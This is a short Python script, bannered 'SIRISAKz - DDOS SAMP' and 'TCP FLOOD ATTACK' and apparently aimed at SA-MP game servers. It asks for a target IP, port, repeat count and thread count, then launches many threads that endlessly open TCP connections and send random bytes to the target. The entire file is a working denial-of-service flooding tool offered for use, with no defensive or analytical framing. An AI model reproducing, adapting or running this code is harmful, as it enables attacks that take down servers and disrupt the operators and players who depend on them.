import random
import socket
import threading

print("")
print("")
print(""" 
	| SIRISAKz - DDOS SAMP | 
""")
print("")
print("""
	  - TCP FLOOD ATTACK -
""")
print("")
print("")
ip = str(input(" IP : "))
port = int(input(" PORT : "))
times = int(input(" TIMES(120) : "))
threads = int(input(" TREADS(1000) : "))

def tcpsirisakz():
	data = random._urandom(16)
	i = ("| SIRISAKz TCP - ATTACK | - ")
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" SENT !")
		except:
			s.close()
			print("Error !!")

for y in range(threads):
		th = threading.Thread(target = tcpsirisakz)
		th.start()